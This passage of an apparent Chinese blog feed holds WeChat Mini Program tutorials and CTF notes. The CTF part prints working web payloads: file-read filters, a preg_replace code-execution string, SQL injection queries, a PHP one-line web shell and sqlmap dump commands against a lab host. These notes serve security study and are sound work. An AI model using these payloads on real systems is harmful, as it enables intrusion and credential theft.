class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;navigationBarTitleText&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HackWork技术工坊&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;navigationBarTextStyle&quot;</span><span class="punctuation">:</span><span class="string">&quot;white&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;backgroundColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#1772cb&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><h4 id="0x0003-让整个页面背景变色"><a href="#0x0003-让整个页面背景变色" class="headerlink" title="0x0003 让整个页面背景变色"></a>0x0003 让整个页面背景变色</h4><p>可以通过直接设置page的样式来设置，在该页面的wxss文件里添加如下样式:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">page&#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#1772cb</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x0004-禁止页面下拉"><a href="#0x0004-禁止页面下拉" class="headerlink" title="0x0004 禁止页面下拉"></a>0x0004 禁止页面下拉</h4><p>适用情况：做的比较短</p><p>目的：增强用户体验，不希望用户可以下拉页面，因为下拉页面会有种页面松动的感觉</p><p>做法：可以在该页面的json文件里配置</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;window&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;disableScroll&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="0x003-自定义顶部导航栏"><a href="#0x003-自定义顶部导航栏" class="headerlink" title="0x003 自定义顶部导航栏"></a>0x003 自定义顶部导航栏</h3><p>适用情况：官方默认的导航栏只能对背景颜色进行更改，想要在导航栏添加一些比较酷炫的效果</p><p>做法：通过自定义导航栏实现，通过设置 app.json中页面配置的 navigationStyle(导航栏样式)配置项的值为 custom，即可实现自定义导航：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;window&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;navigationStyle&quot;</span><span class="punctuation">:</span><span class="string">&quot;custom&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>给小程序的页面配一个好看的壁纸,home.wxss</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">page&#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">https://tcb-1251009918.cos.ap-guangzhou.myqcloud.com/background.jpg</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x004-模板"><a href="#0x004-模板" class="headerlink" title="0x004 模板"></a>0x004 模板</h3><p>适用情况：希望<strong>所有的页面</strong>都有一个相同的底部版权信息</p><p>做法：</p><h4 id="0x0001-静态的页面片段"><a href="#0x0001-静态的页面片段" class="headerlink" title="0x0001 静态的页面片段"></a>0x0001 静态的页面片段</h4><p>使用开发者工具在小程序的pages页面新建一个common文件夹，在common里新建一个foot.wxml，并输入以下代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;foot&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page-foot&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;index-desc&quot;</span> <span class="attr">style</span>=<span class="string">&quot;text-align:center;font-size:12px;bottom:20rpx;position:absolute;bottom:20rpx;width:100%&quot;</span>&gt;</span>云开发技术训练营<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在要引入的页面比如home.wxml的顶部，使用<strong>import</strong>引入这个模板</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">src</span>=<span class="string">&quot;/pages/common/foot.wxml&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>然后在要显示的地方调用比如home.wmxl页面代码的最底部来调用这个模板</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">is</span>=<span class="string">&quot;foot&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h4 id="0x0002-动态的页面片段"><a href="#0x0002-动态的页面片段" class="headerlink" title="0x0002 动态的页面片段"></a>0x0002 动态的页面片段</h4><p>在页面的每一页都有一个相似的页面样式与结果，但是不同的页面有着不同的标题以及页面描述，用数据绑定就能很好的解决这个问题，不同的页面的js data里有不同的数据，而模板的wxml都是固定的框架。</p><p>使用开发者工具在小程序的pages页面新建一个common文件夹，在common里新建一个head.wxml，并输入以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;head&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page-head&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page-head-title&quot;</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page-head-line&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:if</span>=<span class="string">&quot;&#123;&#123;desc&#125;&#125;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;page-head-desc&quot;</span>&gt;</span>&#123;&#123;desc&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再给每个页面的js里的data里添加不同的title和desc信息，再来在页面先引入head.wxml，然后在指定的位置比如wxml代码的前面调用该模板。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">src</span>=<span class="string">&quot;/pages/common/head.wxml&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">is</span>=<span class="string">&quot;foot&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>注意创建模板时，使用的是<code>&lt;template name=&quot;模板名&quot;&gt;&lt;/template&gt;</code>，而调用模板时，使用的是<code>&lt;template is=&quot;模板名&quot; /&gt;</code>，两者之间对应。</p><h3 id="0x005-小程序的客服"><a href="#0x005-小程序的客服" class="headerlink" title="0x005 小程序的客服"></a>0x005 小程序的客服</h3><p>适用情况：开发者在小程序内添加客服消息按钮组件，用户就可在小程序内唤起客服会话页面，给小程序发消息。而开发者（可绑定其他运营人员）也可以直接使用<a href="https://mpkf.weixin.qq.com/">微信公众平台网页版客服工具</a>或者移动端小程序客服小助手进行客服消息回复</p><p>做法：</p><p>在wxml文件里添加如下代码，即可唤起客服会话页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">open-type</span>=<span class="string">&quot;contact&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x006-web-view"><a href="#0x006-web-view" class="headerlink" title="0x006 web-view"></a>0x006 web-view</h3><p>承载网页的容器。会自动铺满整个小程序页面，<strong>个人类型的小程序暂不支持使用。</strong></p><p>web-view组件可<strong>打开关联的公众号的文章</strong></p><p>适用于自媒体用户</p><p>公众号文章可以使用第三方的工具比如秀米</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-view</span> <span class="attr">src</span>=<span class="string">&quot;https://mp.weixin.qq.com/cgi-bin/wx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">web-view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>web-view的也可以绑定备案好的域名，支持JSSDK的接口，因此很有小程序为了省开发成本，点击链接打开的都是网页，并没有做小程序的原生开发，这个就不再讨论范围之内了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Basic Preparation for Mini Program Development</title>
      <link href="/2020/03/20/Basic-Preparation-for-Mini-Program-Development/"/>
      <url>/2020/03/20/Basic-Preparation-for-Mini-Program-Development/</url>
      
        <content type="html"><![CDATA[<h1 id="小程序开发基础准备"><a href="#小程序开发基础准备" class="headerlink" title="小程序开发基础准备"></a>小程序开发基础准备</h1><p>学习技术不要光看视频、教材，一定要动手实践。只有实战，技术才会变得简单。小程序相比其他编程语言来说，可以让我们更快做出一些技术产品。</p><h2 id="0x01-开始前的准备"><a href="#0x01-开始前的准备" class="headerlink" title="0x01 开始前的准备"></a>0x01 开始前的准备</h2><p>小程序的开发有两样东西必不可少，一个是小程序开发的<strong>技术文档</strong>；还有一个就是小程序的<strong>开发者工具</strong>。</p><p><strong>开发者工具</strong>：<a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html">小程序开发者工具下载地址</a></p><p>大家可以根据自己电脑的操作系统来下载对应的<strong>稳定版安装包</strong>进行安装。就和我们写Word、PPT文档要用Office的软件一样，我们要在开发者工具上多多动手，技术才能掌握的更加真切。</p><p><strong>技术文档</strong>：<a href="https://developers.weixin.qq.com/miniprogram/dev/index.html">官方小程序技术文档</a></p><p>技术文档大家先只需要<strong>花五分钟左右的时间</strong>了解大致的结构即可，<strong>先按照我们的教学步骤学完之后</strong>再来看也不迟。官方的小程序技术文档过于全面而且详细，对于初学者或者零基础的朋友来说，我们会引导大家如何循序渐进的学习文档里的技术知识。</p><blockquote><p><strong>多看技术文档</strong>和<strong>多用开发工具</strong>也是我们学习其他编程语言或技术最为重要的两点，凡是脱离技术文档和开发工具看视频、看文章以及搜集再多的资料都是舍本求末的错误做法，而这也是很多初学者的一个通病。</p><p>值得注意的是小程序的开发功能更新非常频繁，很多网上的教程内容都比较过时，而只有技术文档才是同步最新的。无论你是初学者还是高手，技术文档都是我们技术开发的基础与落脚点，常读常新。</p></blockquote><h2 id="0x02-注册微信小程序"><a href="#0x02-注册微信小程序" class="headerlink" title="0x02 注册微信小程序"></a>0x02 注册微信小程序</h2><p>小程序的注册非常方便，打开小程序注册页面，按照要求填入个人的信息，验证邮箱和手机号，扫描二维码绑定你的微信号即可，3分钟左右的时间即可搞定。</p><p><strong>注册页面：</strong><a href="https://mp.weixin.qq.com/wxopen/waregister?action=step1">小程序注册页面</a></p><blockquote><p>注册小程序时不能使用注册过微信公众号、微信开放平台的邮箱哦，也就是需要你使用一个其他邮箱才行。</p></blockquote><p>当我们注册成功后，就可以自动登入到小程序的后台管理页面啦，如果你不小心关掉了后台页面，也可以点击小程序后台管理登录页进行登录。</p><p><strong>后台管理页：</strong><a href="https://mp.weixin.qq.com/cgi-bin/home?t=home/index&lang=zh_CN">小程序后台管理登录页</a></p><blockquote><p>小程序和微信公众号的登录页都是同一个页面，他们会根据你的不同的注册邮箱来进行跳转。</p></blockquote><p>进入到小程序的后台管理页后，点击左侧菜单的<strong>开发</strong>进入设置页，然后再点击<strong>开发设置</strong>，在<strong>开发者ID</strong>里就可以看到**AppID(小程序ID)**，这个待会我们有用。</p><blockquote><p>注意小程序的ID（AppID）不是你注册的邮箱和用户名，你需要到后台查看才行哦~</p></blockquote><h2 id="0x03-新建一个模板小程序"><a href="#0x03-新建一个模板小程序" class="headerlink" title="0x03 新建一个模板小程序"></a>0x03 新建一个模板小程序</h2><p>安装完开发者工具之后，我们使用微信扫码登录开发者工具，然后使用开发者工具新建一个小程序的项目，</p><ul><li><strong>项目名称：</strong>这个可以根据自己的需要任意填写，可以是中文；</li><li><strong>目录：</strong>大家需要先在电脑上新建一个空文件夹，然后选择这个空文件夹；</li><li><strong>AppID：</strong>就是之前我们找到的**AppID(小程序ID)**（也可以点击右边的下拉框，下拉选择AppID）</li><li><strong>开发模式</strong>为小程序</li><li><strong>后端服务</strong>选择<strong>不使用云服务</strong>，<strong>注意为了教学的需要，先选择不使用云服务</strong></li><li><strong>语言</strong>为JavaScript</li></ul><p>点击<strong>新建</strong>确认之后就能在开发者工具的<strong>模拟器</strong>里看到一个简单的<strong>Hello World模板小程序</strong>，在编辑器里看到这个小程序的源代码。</p><blockquote><p><strong>小任务：</strong> 分别点击开发者工具<strong>工具栏</strong>上的<strong>模拟器</strong>、<strong>编辑器</strong>、<strong>调试器</strong>，以及下面的手机下拉框、显示百分比，看看有什么效果。找到开发者工具的<strong>菜单栏</strong>，在<strong>项目</strong>菜单栏里找到查看所有项目，在<strong>设置</strong>菜单栏里找到<strong>外观设置</strong>，切换一下主题、调试器主题（深色、浅色）。</p></blockquote><p>接下来，我们点击开发者工具的工具栏里的<strong>预览</strong>图标，就会弹出一个二维码，使用你的手机微信扫描这个二维码就能在微信里看到这个小程序啦。<strong>以后我们要自己开发一个小程序都可以按照上面的操作新建一个模板小程序，然后在这个的基础上修改开发</strong>。</p><blockquote><p>如果你没有使用微信登录开发者工具，以及你的微信不是该小程序的开发者是没法预览的哦。这个<strong>Hello World模板小程序</strong>非常简单，但是它的文件结构却是完整的。</p></blockquote><h2 id="0x04-开通云开发服务"><a href="#0x04-开通云开发服务" class="headerlink" title="0x04 开通云开发服务"></a>0x04 开通云开发服务</h2><p>点击微信开发者工具的“<strong>云开发</strong>”图标，在弹出框里点击“<strong>开通</strong>”，同意协议后，会弹出<strong>创建环境</strong>的对话框。这时会要求你输入<strong>环境名称</strong>和<strong>环境ID</strong>，以及当前云开发的基础环境配额（基础配额免费，而且足够你使用哦）。</p><blockquote><p>建议你<strong>环境名称</strong>可以使用 xly、<strong>环境ID</strong>自动生成即可，当你的云开发环境出现问题的时候，你可以提供你的环境ID，云开发团队会有专人为你解答。</p></blockquote><p>按照对话框提示的要求填写完之后，点击<strong>创建</strong>，会初始化环境，环境初始化成功后会自动弹出云开发控制台，这样我们的云开发服务就开通啦。大家可以花<strong>两分钟左右</strong>的时间熟悉一下云开发控制台的界面。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF Skills Summary</title>
      <link href="/2020/02/13/CTF-Skills-Summary/"/>
      <url>/2020/02/13/CTF-Skills-Summary/</url>
      
        <content type="html"><![CDATA[<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p> <a href="11">http://xxxxxx/index.php?page=index</a><br />类似于这样的链接，应该直接想到任意文件读取<br />page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<br />实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line"><span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line"><span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这样的代码我们可以这样构造payload:<br />在HTTP头添加：<br />X-Forwarded-For:127.0.0.1<br />&#x2F;index.php?pat&#x3D;&#x2F;a&#x2F;e&amp;rep&#x3D;system(‘ls’)&amp;sub&#x3D;a<br />从而爆出文件列<br />&#x2F;index.php?pat&#x3D;&#x2F;a&#x2F;e&amp;rep&#x3D;system(‘ls+文件名’)&amp;sub&#x3D;a<br />从而爆出该文件下的文件名<br />&#x2F;index.php?pat&#x3D;&#x2F;a&#x2F;e&amp;rep&#x3D;system(‘ls+文件名&#x2F;文件名’)&amp;sub&#x3D;a</p><h2 id="command-execution-命令执行"><a href="#command-execution-命令执行" class="headerlink" title="command_execution(命令执行)"></a>command_execution(命令执行)</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1575257163854-04ec4931-700a-40e9-a1d7-55f1491ddb81.png" alt="image.png"><br><a href="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1575257285564-26f2d03e-567a-40c0-817e-781b485023b1.png">!image.png</a><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1575257306576-1d6a81c0-39fb-425b-a0be-68a1429beb61.png" alt="image.png"></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>爆库(xxxx，爆表(xxx，爆列(xx，爆值(x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,1,database() #</span><br><span class="line">1&#x27; union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class="line">1&#x27; union select 1,1,group_concat(column_name) from information_schema.column where tabele_name=&#x27; xxx&#x27; #</span><br><span class="line">1&#x27; union select 1,1,xx from xxxx.xxx # </span><br><span class="line">or </span><br><span class="line">1&#x27;union select 1,1,group_concat(xx) from xxx #</span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>后缀名可改为：php5<br />一句话可以写为：<script language="php">eval($_POST['xss'])</script></p><h2 id="LFI漏洞的黑盒判断方法"><a href="#LFI漏洞的黑盒判断方法" class="headerlink" title="LFI漏洞的黑盒判断方法"></a>LFI漏洞的黑盒判断方法</h2><p>单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。</p><h2 id="SQL与文件上传"><a href="#SQL与文件上传" class="headerlink" title="SQL与文件上传"></a>SQL与文件上传</h2><p>典型的2015RCTF题型 打着文件上传的幌子，实际上是SQL注入，注入方式也很特别，所以当我们拿到文件上传想关题目，什么姿势都试过了，却拿不到flag，这个时候可以换个方式，找找注入点，一般注入点在filename,payload如下:</p><h4 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex(database()),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">(<span class="number">16</span><span class="operator">=</span><span class="operator">&gt;</span><span class="number">10</span><span class="operator">=</span><span class="operator">&gt;</span>hex<span class="operator">=</span><span class="operator">&gt;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex(database()),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">(<span class="number">16</span><span class="operator">=</span><span class="operator">&gt;</span><span class="number">10</span><span class="operator">=</span><span class="operator">&gt;</span>hex<span class="operator">=</span><span class="operator">&gt;</span>)</span><br></pre></td></tr></table></figure><h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),25,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;</span>hello_flag_is_here<span class="string">&#x27; limit 0,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;</span>hello_flag_is_here<span class="string">&#x27; limit 0,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="xONsw"></a></p><h4 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>类似于这样的题目都是骚题目，所以flag肯定不会一下就出来，每次只会 出来一部分，所以需要我们迂回注入<br />即为修改一下substr的起始位置参数，看看后边还有没有<br />当然根据情况而定，如果一次性爆出来就不需要迂回了</p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><h4 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h4><blockquote><p>robot:在这个文件中网站管理者可以声明该网站中不想被搜索引擎访问的部分，或者指定搜索引擎只收录指定的内容。</p></blockquote><p>当拿到一个网站，在找不到突破口的情况下，可以尝试robots.txt,看看有没有新发现</p><h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><p>也可以使用dirsearch进行扫描,Linux下惯用语法:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./dirsearch.py -u url -e *</span><br></pre></td></tr></table></figure><h2 id="魔术方法-wakeup绕过"><a href="#魔术方法-wakeup绕过" class="headerlink" title="魔术方法__wakeup绕过"></a>魔术方法__wakeup绕过</h2><p>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup</code>的执行。<br />eg:<br />O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}<br />把 1改为大于它的数即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF WEB Advanced</title>
      <link href="/2020/02/12/XCTF-WEB-Advanced/"/>
      <url>/2020/02/12/XCTF-WEB-Advanced/</url>
      
        <content type="html"><![CDATA[<h2 id="cat-抓住那只猫"><a href="#cat-抓住那只猫" class="headerlink" title="cat:抓住那只猫"></a>cat:抓住那只猫</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1575112554428-a11f51c8-7284-4b2d-931b-7305e0dc7e63.png" alt="image.png"><br />在输入任何网站都无效的情况下，输入localhost<br /><img src="https://cdn.nlark.com/yuque/0/2019/png/283368/1575112604627-3d81eb2c-c7b8-45da-98e8-8b9750f90e59.png" alt="image.png"><br />发现还是有回显的，进行Fuzz测试发现@未被过滤，会将@编码为%40<br />试一试宽字节，%bf<br /><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1575112743182-0eea4b5f-897a-4030-a945-dec36c0116b3.png" alt="image.png"><br />发现是一些HTML网页代码，带着好奇心，我打开了PHPSTUDY进行本地测试<br /><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1575112796316-97270c0c-cdb5-4603-b371-aa0d06ee954c.png" alt="image.png"><br />看到了熟悉的django报错页面，看来是将输入的参数传到了后端的django服务中进行解析，而django设置了编码为gbk导致错误编码了宽字符（超过了ascii码范围）。<br />看了一下大佬的WP发现@的作用是读取文件内容</p><p><a name="Nz8qN"></a></p><h2 id="ics-04"><a href="#ics-04" class="headerlink" title="ics-04"></a>ics-04</h2><p>有三个可以访问的功能，注册、登录和找回密码<br />注册功能：没有sql注入，一个账号可以重复注册漏洞<br />登录功能：没有sql注入，一个账号不同密码能够登录<br />找回密码功能：存在sql注入，payload：<br />![A2&#96;Y[TM(NN{(E]ICSQEHDBG.png](<a href="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1576416559902-5f3c283d-4f95-4dad-9d07-473c685cb6d1.png">https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1576416559902-5f3c283d-4f95-4dad-9d07-473c685cb6d1.png</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap &quot;http://111.198.29.45:43546/findpwd.php&quot; --data=&quot;username=1&quot;</span><br><span class="line">sqlmap &quot;http://111.198.29.45:43546/findpwd.php&quot; --data=&quot;username=1&quot; --dbs</span><br><span class="line">sqlmap &quot;http://111.198.29.45:43546/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 --tables</span><br><span class="line">sqlmap &quot;http://111.198.29.45:43546/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 -T user --columns</span><br><span class="line">sqlmap &quot;http://111.198.29.45:43546/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 -T user -C username&amp;password --dump</span><br></pre></td></tr></table></figure><p>得到账号：c3tlwDmIn23，密码：2f8667f381ff50ced6a3edc259260ba9<br />利用重复注册账号漏洞，注册账号c3tlwDmIn23，密码123456，登录成功，取得flag</p><p><a 